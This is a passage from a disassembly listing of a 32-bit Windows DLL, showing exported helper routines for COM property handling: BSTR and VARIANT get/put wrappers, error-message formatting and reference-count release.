Ordinal948	endp

; Exported entry 950.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal950
Ordinal950	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+0C8h]
		cmp	dword ptr [edi], 0
		jnz	short loc_6AF47126
		call	Ordinal954
		mov	[esi+0C4h], eax
		mov	dword ptr [edi], 1

loc_6AF47126:				; CODE XREF: Ordinal950+Dj
		mov	eax, [esi+0C4h]
		pop	edi
		pop	esi
		retn
Ordinal950	endp

; Exported entry 951.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal951
Ordinal951	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+0D0h]
		cmp	dword ptr [edi], 0
		jnz	short loc_6AF4714F
		call	Ordinal955
		mov	[esi+0CCh], eax
		mov	dword ptr [edi], 1

loc_6AF4714F:				; CODE XREF: Ordinal951+Dj
		mov	eax, [esi+0CCh]
		pop	edi
		pop	esi
		retn
Ordinal951	endp

; Exported entry 937.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal937
Ordinal937	proc near		; CODE XREF: Ordinal936+28p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+14h], 1
		jz	short loc_6AF47165
		xor	eax, eax
		jmp	short loc_6AF471BB
; ---------------------------------------------------------------------------

loc_6AF47165:				; CODE XREF: Ordinal937+7j
		cmp	dword ptr [esi+8], 4
		push	ebx
		push	edi
		jnz	short loc_6AF471A5
		cmp	dword ptr [esi+0Ch], 3
		jnz	short loc_6AF471A5
		cmp	word ptr [esi+10h], 4BEh
		ja	short loc_6AF471A5
		mov	ebx, ds:_mbsstr
		lea	edi, [esi+18h]
		push	offset byte_6AF54510 ; unsigned	__int8 *
		push	edi		; unsigned __int8 *
		call	ebx ; _mbsstr
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF471A0
		push	offset aB	; "b"
		push	edi		; unsigned __int8 *
		call	ebx ; _mbsstr
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF471A5

loc_6AF471A0:				; CODE XREF: Ordinal937+38j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF471B9
; ---------------------------------------------------------------------------

loc_6AF471A5:				; CODE XREF: Ordinal937+13j
					; Ordinal937+19j ...
		cmp	[esp+0Ch+arg_0], 0
		jnz	short loc_6AF471B0
		xor	eax, eax
		jmp	short loc_6AF471B9
; ---------------------------------------------------------------------------

loc_6AF471B0:				; CODE XREF: Ordinal937+52j
		push	1
		mov	ecx, esi
		call	Ordinal939

loc_6AF471B9:				; CODE XREF: Ordinal937+4Bj
					; Ordinal937+56j
		pop	edi
		pop	ebx

loc_6AF471BB:				; CODE XREF: Ordinal937+Bj
		pop	esi
		retn	4
Ordinal937	endp

; Exported entry 938.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal938
Ordinal938	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+14h], 1
		jz	short loc_6AF471CC
		xor	eax, eax
		jmp	short loc_6AF47222
; ---------------------------------------------------------------------------

loc_6AF471CC:				; CODE XREF: Ordinal938+7j
		cmp	dword ptr [esi+8], 4
		push	ebx
		push	edi
		jnz	short loc_6AF4720C
		cmp	dword ptr [esi+0Ch], 3
		jnz	short loc_6AF4720C
		cmp	word ptr [esi+10h], 4BEh
		jb	short loc_6AF4720C
		mov	ebx, ds:_mbsstr
		lea	edi, [esi+18h]
		push	offset aC_1	; "C"
		push	edi		; unsigned __int8 *
		call	ebx ; _mbsstr
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF47207
		push	offset aC_0	; "c"
		push	edi		; unsigned __int8 *
		call	ebx ; _mbsstr
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF4720C

loc_6AF47207:				; CODE XREF: Ordinal938+38j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF47220
; ---------------------------------------------------------------------------

loc_6AF4720C:				; CODE XREF: Ordinal938+13j
					; Ordinal938+19j ...
		cmp	[esp+0Ch+arg_0], 0
		jnz	short loc_6AF47217
		xor	eax, eax
		jmp	short loc_6AF47220
; ---------------------------------------------------------------------------

loc_6AF47217:				; CODE XREF: Ordinal938+52j
		push	1
		mov	ecx, esi
		call	Ordinal939

loc_6AF47220:				; CODE XREF: Ordinal938+4Bj
					; Ordinal938+56j
		pop	edi
		pop	ebx

loc_6AF47222:				; CODE XREF: Ordinal938+Bj
		pop	esi
		retn	4
Ordinal938	endp

; Exported entry 943.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal943
Ordinal943	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		cmp	dword ptr [ecx+14h], 2
		jnz	short loc_6AF47244
		cmp	dword ptr [ecx+8], 3
		jnz	short loc_6AF4723D
		cmp	dword ptr [ecx+0Ch], 33h
		jnz	short loc_6AF4723D
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF4724F
; ---------------------------------------------------------------------------

loc_6AF4723D:				; CODE XREF: Ordinal943+Aj
					; Ordinal943+10j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF47248

loc_6AF47244:				; CODE XREF: Ordinal943+4j
		xor	eax, eax
		jmp	short locret_6AF4724F
; ---------------------------------------------------------------------------

loc_6AF47248:				; CODE XREF: Ordinal943+1Cj
		push	1
		call	Ordinal944

locret_6AF4724F:			; CODE XREF: Ordinal943+15j
					; Ordinal943+20j
		retn	4
Ordinal943	endp

; Exported entry 936.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal936
Ordinal936	proc near		; CODE XREF: Ordinal935+28p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		xor	eax, eax
		inc	eax
		cmp	[ecx+14h], eax
		jnz	short loc_6AF47275
		cmp	dword ptr [ecx+8], 4
		jnz	short loc_6AF4726E
		cmp	dword ptr [ecx+0Ch], 0
		jnz	short loc_6AF4726E
		cmp	word ptr [ecx+10h], 457h
		jnb	short locret_6AF4727F

loc_6AF4726E:				; CODE XREF: Ordinal936+Cj
					; Ordinal936+12j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF47279

loc_6AF47275:				; CODE XREF: Ordinal936+6j
		xor	eax, eax
		jmp	short locret_6AF4727F
; ---------------------------------------------------------------------------

loc_6AF47279:				; CODE XREF: Ordinal936+21j
		push	eax
		call	Ordinal937

locret_6AF4727F:			; CODE XREF: Ordinal936+1Aj
					; Ordinal936+25j
		retn	4
Ordinal936	endp

; Exported entry 935.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal935
Ordinal935	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		xor	eax, eax
		inc	eax
		cmp	[ecx+14h], eax
		jnz	short loc_6AF472A5
		cmp	dword ptr [ecx+8], 4
		jnz	short loc_6AF4729E
		cmp	dword ptr [ecx+0Ch], 0
		jnz	short loc_6AF4729E
		cmp	word ptr [ecx+10h], 457h
		jb	short locret_6AF472AF

loc_6AF4729E:				; CODE XREF: Ordinal935+Cj
					; Ordinal935+12j
		cmp	[esp+arg_0], 0
		jnz	short loc_6AF472A9

loc_6AF472A5:				; CODE XREF: Ordinal935+6j
		xor	eax, eax
		jmp	short locret_6AF472AF
; ---------------------------------------------------------------------------

loc_6AF472A9:				; CODE XREF: Ordinal935+21j
		push	eax
		call	Ordinal936

locret_6AF472AF:			; CODE XREF: Ordinal935+1Aj
					; Ordinal935+25j
		retn	4
Ordinal935	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF472B2(OLECHAR *psz)
sub_6AF472B2	proc near		; CODE XREF: sub_6AF477BF+2Bp

psz		= dword	ptr  4

		push	esi
		push	[esp+4+psz]	; psz
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		mov	dword ptr [esi+8], 1
		call	ds:SysAllocString
		test	eax, eax
		mov	[esi], eax
		jnz	short loc_6AF472E0
		cmp	[esp+4+psz], eax
		jz	short loc_6AF472E0
		push	8007000Eh
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF472E0:				; CODE XREF: sub_6AF472B2+1Cj
					; sub_6AF472B2+22j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF472B2	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF472E6	proc near		; CODE XREF: Ordinal958+47p
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF47313
		push	eax		; bstr
		call	ds:SysStringByteLen
		push	eax		; len
		push	dword ptr [esi]	; psz
		call	ds:SysAllocStringByteLen
		mov	esi, eax
		test	esi, esi
		jnz	short loc_6AF4730F
		push	8007000Eh
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF4730F:				; CODE XREF: sub_6AF472E6+1Dj
		mov	eax, esi
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF47313:				; CODE XREF: sub_6AF472E6+7j
		xor	eax, eax
		pop	esi
		retn
sub_6AF472E6	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF47317	proc near		; CODE XREF: sub_6AF4777F+18p
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF47327
		push	eax		; bstrString
		call	ds:SysFreeString

loc_6AF47327:				; CODE XREF: sub_6AF47317+7j
		mov	esi, [esi+4]
		test	esi, esi
		jz	short loc_6AF47335
		push	esi		; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx

loc_6AF47335:				; CODE XREF: sub_6AF47317+15j
		pop	esi
		retn
sub_6AF47317	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF47337	proc near		; CODE XREF: sub_6AF47470+6Dp

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, 80040200h
		jl	short loc_6AF47352
		cmp	eax, 8004FFFFh
		jg	short loc_6AF47352
		add	eax, 0FFFFFE00h
		movzx	eax, ax
		retn
; ---------------------------------------------------------------------------

loc_6AF47352:				; CODE XREF: sub_6AF47337+9j
					; sub_6AF47337+10j
		xor	eax, eax
		retn
sub_6AF47337	endp

; Exported entry 956.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal956
Ordinal956	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF5D414
		retn
Ordinal956	endp

; Exported entry 957.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal957
Ordinal957	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5D414
		retn
Ordinal957	endp

; Exported entry 960.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal960
Ordinal960	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF47375
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF47375:				; CODE XREF: Ordinal960+8j
		mov	ecx, [esp+arg_0]
		mov	[eax], ecx
		xor	eax, eax
		retn
Ordinal960	endp

; Exported entry 961.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal961
Ordinal961	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	ecx, [esp+arg_0]
		mov	[ecx], eax
		xor	eax, eax
		retn
Ordinal961	endp

; Exported entry 962.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal962(double, int)
		public Ordinal962
Ordinal962	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= qword	ptr  4
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF4739B
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF4739B:				; CODE XREF: Ordinal962+8j
		fld	[esp+arg_0]
		fstp	qword ptr [eax]
		xor	eax, eax
		retn
Ordinal962	endp

; Exported entry 963.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal963(int, double)
		public Ordinal963
Ordinal963	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= qword	ptr  8

		mov	eax, [esp+arg_0]
		fld	[esp+arg_4]
		fstp	qword ptr [eax]
		xor	eax, eax
		retn
Ordinal963	endp

; Exported entry 964.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal964
Ordinal964	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_8]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF473C1
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF473C1:				; CODE XREF: Ordinal964+8j
		mov	ecx, [esp+arg_0]
		mov	[eax], ecx
		mov	ecx, [esp+arg_4]
		mov	[eax+4], ecx
		xor	eax, eax
		retn
Ordinal964	endp

; Exported entry 965.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal965
Ordinal965	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		mov	ecx, [esp+arg_4]
		mov	[eax], ecx
		mov	ecx, [esp+arg_8]
		mov	[eax+4], ecx
		xor	eax, eax
		retn
Ordinal965	endp

; Exported entry 966.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal966
Ordinal966	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF473F5
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF473F5:				; CODE XREF: Ordinal966+8j
		mov	ecx, [esp+arg_0]
		neg	ecx
		sbb	ecx, ecx
		mov	[eax], cx
		xor	eax, eax
		retn
Ordinal966	endp

; Exported entry 967.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal967
Ordinal967	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= word ptr  8

		mov	ecx, [esp+arg_0]
		xor	eax, eax
		cmp	[esp+arg_4], ax
		setnz	al
		mov	[ecx], eax
		xor	eax, eax
		retn
Ordinal967	endp

; Exported entry 968.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal968
Ordinal968	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= word ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF47426
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF47426:				; CODE XREF: Ordinal968+8j
		mov	cx, [esp+arg_0]
		mov	[eax], cx
		xor	eax, eax
		retn
Ordinal968	endp

; Exported entry 969.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal969
Ordinal969	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= word ptr  8

		mov	ax, [esp+arg_4]
		mov	ecx, [esp+arg_0]
		mov	[ecx], ax
		xor	eax, eax
		retn
Ordinal969	endp

; Exported entry 970.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal970
Ordinal970	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= byte ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	eax, [eax]
		test	eax, eax
		jnz	short loc_6AF47450
		mov	eax, 80004003h
		retn
; ---------------------------------------------------------------------------

loc_6AF47450:				; CODE XREF: Ordinal970+8j
		mov	cl, [esp+arg_0]
		neg	cl
		sbb	ecx, ecx
		mov	[eax], cx
		xor	eax, eax
		retn
Ordinal970	endp

; Exported entry 971.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal971
Ordinal971	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= word ptr  8

		cmp	[esp+arg_4], 0
		mov	ecx, [esp+arg_0]
		setnz	al
		mov	[ecx], al
		xor	eax, eax
		retn
Ordinal971	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF47470	proc near		; CODE XREF: Ordinal958+68p
					; sub_6AF47671+1Ap ...
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+0Ch]
		xor	ebx, ebx
		cmp	[esi], ebx
		jnz	loc_6AF47504
		push	ebx		; Arguments
		push	ebx		; nSize
		push	esi		; lpBuffer
		push	400h		; dwLanguageId
		push	dword ptr [edi+4] ; dwMessageId
		push	ebx		; lpSource
		push	1100h		; dwFlags
		call	ds:FormatMessageA
		mov	eax, [esi]
		cmp	eax, ebx
		jz	short loc_6AF474C7
		push	eax		; lpString
		call	ds:lstrlenA
		cmp	eax, 1
		jle	short loc_6AF47504
		mov	ecx, [esi]
		lea	ecx, [eax+ecx-1]
		cmp	byte ptr [ecx],	0Ah
		jnz	short loc_6AF47504
		mov	[ecx], bl
		mov	ecx, [esi]
		lea	eax, [eax+ecx-2]
		cmp	byte ptr [eax],	0Dh
		jnz	short loc_6AF47504
		mov	[eax], bl
		jmp	short loc_6AF47504
; ---------------------------------------------------------------------------

loc_6AF474C7:				; CODE XREF: sub_6AF47470+2Dj
		push	ebp
		push	20h		; uBytes
		push	ebx		; uFlags
		call	ds:LocalAlloc
		mov	ebp, eax
		cmp	ebp, ebx
		mov	[esi], ebp
		jz	short loc_6AF47503
		mov	edi, [edi+4]
		push	edi
		call	sub_6AF47337
		cmp	ax, bx
		pop	ecx
		jz	short loc_6AF474F3
		movzx	eax, ax
		push	eax
		push	offset aIdispatchError ; "IDispatch error #%d"
		jmp	short loc_6AF474F9
; ---------------------------------------------------------------------------

loc_6AF474F3:				; CODE XREF: sub_6AF47470+76j
		push	edi
		push	offset aUnknownError0x ; "Unknown error	0x%0lX"

loc_6AF474F9:				; CODE XREF: sub_6AF47470+81j
		push	ebp		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch

loc_6AF47503:				; CODE XREF: sub_6AF47470+67j
		pop	ebp

loc_6AF47504:				; CODE XREF: sub_6AF47470+Cj
					; sub_6AF47470+39j ...
		mov	eax, [esi]
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_6AF47470	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_7. PRESS KEYPAD "+" TO EXPAND]
; Exported entry 958.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal958
Ordinal958	proc near		; DATA XREF: .rdata:off_6AF66098o

var_30		= byte ptr -30h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_95 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 24h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [esi]
		test	eax, eax
		push	edi
		mov	[ebp+var_10], esp
		jnz	short loc_6AF4754D
		mov	eax, 80004003h
		jmp	loc_6AF475D8
; ---------------------------------------------------------------------------

loc_6AF4754D:				; CODE XREF: Ordinal958+1Aj
		and	dword ptr [eax], 0
		push	offset aCpropertyhelpe ; "CPropertyHelper::GetString()"
		lea	ecx, [ebp+var_30]
		call	Ordinal751
		mov	eax, [ebp+arg_0]
		and	[ebp+var_4], 0
		mov	ecx, [eax]
		test	ecx, ecx
		mov	byte ptr [ebp+var_4], 1
		jz	short loc_6AF475B8
		call	sub_6AF472E6
		jmp	short loc_6AF475BA
; ---------------------------------------------------------------------------

loc_6AF47575:				; DATA XREF: .rdata:6AF6392Co
		push	14h
		lea	ecx, [ebp+var_30]
		call	Ordinal649
		push	offset a_com_error ; "_com_error"
		lea	ecx, [ebp+var_30]
		call	Ordinal762
		mov	ecx, [ebp+arg_4]
		call	sub_6AF47470
		push	eax		; Src
		lea	ecx, [ebp+var_30]
		call	Ordinal764
		lea	ecx, [ebp+var_30]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF475BE
		retn
; ---------------------------------------------------------------------------

loc_6AF475B8:				; CODE XREF: Ordinal958+45j
		xor	eax, eax

loc_6AF475BA:				; CODE XREF: Ordinal958+4Cj
		mov	ecx, [esi]
		mov	[ecx], eax

loc_6AF475BE:				; DATA XREF: Ordinal958+8Bo
		lea	ecx, [ebp+var_30]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_30]
		neg	esi
		call	Ordinal752
		mov	eax, esi

loc_6AF475D8:				; CODE XREF: Ordinal958+21j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal958	endp ; sp-analysis failed

; Exported entry 972.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal972(VARIANTARG *pvargSrc, int)
		public Ordinal972
Ordinal972	proc near		; DATA XREF: .rdata:off_6AF66098o

var_30		= byte ptr -30h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
pvargSrc	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_96 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 24h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	eax, [esi]
		test	eax, eax
		push	edi
		mov	[ebp+var_10], esp
		jnz	short loc_6AF4760A
		mov	eax, 80004003h
		jmp	short loc_6AF47662
; ---------------------------------------------------------------------------

loc_6AF4760A:				; CODE XREF: Ordinal972+1Aj
		push	eax		; pvarg
		call	ds:VariantClear
		push	offset aCpropertyhel_0 ; "CPropertyHelper::GetVariant()"
		lea	ecx, [ebp+var_30]
		call	Ordinal751
		push	[ebp+pvargSrc]	; pvargSrc
		and	[ebp+var_4], 0
		push	dword ptr [esi]	; pvarDest
		mov	byte ptr [ebp+var_4], 1
		call	ds:VariantCopyInd
		mov	esi, eax
		test	esi, esi
		jge	short loc_6AF47648
		push	offset aCpropertyhel_1 ; "CPropertyHelper::GetVariant()	: Variant"...
		call	sub_6AF3102E
		pop	ecx
		push	esi
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF47648:				; CODE XREF: Ordinal972+4Ej
					; DATA XREF: sub_6AF47671+3Do
		lea	ecx, [ebp+var_30]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_30]
		neg	esi
		call	Ordinal752
		mov	eax, esi

loc_6AF47662:				; CODE XREF: Ordinal972+21j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal972	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF47671	proc near		; DATA XREF: .rdata:6AF63984o
		push	14h
		lea	ecx, [ebp-30h]
		call	Ordinal649
		push	offset a_com_error ; "_com_error"
		lea	ecx, [ebp-30h]
		call	Ordinal762
		mov	ecx, [ebp+0Ch]
		call	sub_6AF47470
		push	eax		; Src
		lea	ecx, [ebp-30h]
		call	Ordinal764
		lea	ecx, [ebp-30h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF47648
		retn
sub_6AF47671	endp

; Exported entry 973.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal973(VARIANTARG *pvarDest, VARIANTARG pvargSrc)
		public Ordinal973
Ordinal973	proc near		; DATA XREF: .rdata:off_6AF66098o

var_34		= byte ptr -34h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
pvarDest	= dword	ptr  8
pvargSrc	= VARIANTARG ptr  0Ch

		mov	eax, offset unknown_libname_97 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 28h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCpropertyhel_2 ; "CPropertyHelper::PutVariant()"
		lea	ecx, [ebp+var_34]
		call	Ordinal751
		push	[ebp+pvarDest]	; pvarg
		and	[ebp+var_4], 0
		mov	byte ptr [ebp+var_4], 1
		call	ds:VariantClear
		test	eax, eax
		jge	short loc_6AF476EF
		push	eax
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF476EF:				; CODE XREF: Ordinal973+33j
		lea	eax, [ebp+pvargSrc]
		push	eax		; pvargSrc
		push	[ebp+pvarDest]	; pvarDest
		call	ds:VariantCopyInd
		mov	esi, eax
		test	esi, esi
		jge	short loc_6AF47713
		push	offset aCpropertyhel_3 ; "CPropertyHelper::PutVariant()	: Variant"...
		call	sub_6AF3102E
		pop	ecx
		push	esi
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF47713:				; CODE XREF: Ordinal973+4Cj
					; DATA XREF: sub_6AF4773C+3Do
		lea	ecx, [ebp+var_34]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_34]
		neg	esi
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal973	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4773C	proc near		; DATA XREF: .rdata:6AF639DCo
		push	14h
		lea	ecx, [ebp-34h]
		call	Ordinal649
		push	offset a_com_error ; "_com_error"
		lea	ecx, [ebp-34h]
		call	Ordinal762
		mov	ecx, [ebp-14h]
		call	sub_6AF47470
		push	eax		; Src
		lea	ecx, [ebp-34h]
		call	Ordinal764
		lea	ecx, [ebp-34h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF47713
		retn
sub_6AF4773C	endp


; =============== S U B	R O U T	I N E =======================================


; int __fastcall sub_6AF4777F(void *)
sub_6AF4777F	proc near		; CODE XREF: sub_6AF477AC+9p
		push	esi
		push	edi
		mov	esi, ecx
		lea	edi, [esi+8]
		push	edi		; lpAddend
		call	ds:InterlockedDecrement
		test	eax, eax
		jnz	short loc_6AF477A7
		test	esi, esi
		jz	short loc_6AF477A3
		mov	ecx, esi
		call	sub_6AF47317
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF477A3:				; CODE XREF: sub_6AF4777F+14j
		xor	eax, eax
		jmp	short loc_6AF477A9
; ---------------------------------------------------------------------------

loc_6AF477A7:				; CODE XREF: sub_6AF4777F+10j
		mov	eax, [edi]

loc_6AF477A9:				; CODE XREF: sub_6AF4777F+26j
		pop	edi
		pop	esi
		retn
sub_6AF4777F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF477AC	proc near		; CODE XREF: sub_6AF477BF+Ep
		push	esi
		mov	esi, ecx
		mov	ecx, [esi]	; void *
		test	ecx, ecx
		jz	short loc_6AF477BD
		call	sub_6AF4777F
		and	dword ptr [esi], 0

loc_6AF477BD:				; CODE XREF: sub_6AF477AC+7j
		pop	esi
		retn
sub_6AF477AC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF477BF(OLECHAR *psz)
sub_6AF477BF	proc near		; CODE XREF: Ordinal959+30p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
psz		= dword	ptr  8

		mov	eax, offset unknown_libname_98 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		mov	esi, ecx
		call	sub_6AF477AC
		push	0Ch		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		pop	ecx
		mov	ecx, eax
		mov	[ebp+var_10], ecx
		and	[ebp+var_4], 0
		test	ecx, ecx
		jz	short loc_6AF477F1
		push	[ebp+psz]	; psz
		call	sub_6AF472B2
		jmp	short loc_6AF477F3
; ---------------------------------------------------------------------------

loc_6AF477F1:				; CODE XREF: sub_6AF477BF+26j
		xor	eax, eax

loc_6AF477F3:				; CODE XREF: sub_6AF477BF+30j
		or	[ebp+var_4], 0FFFFFFFFh
		test	eax, eax
		mov	[esi], eax
		jnz	short loc_6AF47807
		push	8007000Eh
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF47807:				; CODE XREF: sub_6AF477BF+3Cj
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF477BF	endp

; Exported entry 959.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal959
Ordinal959	proc near		; DATA XREF: .rdata:off_6AF66098o

var_34		= byte ptr -34h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_99 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 28h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCpropertyhel_4 ; "CPropertyHelper::PutString()"
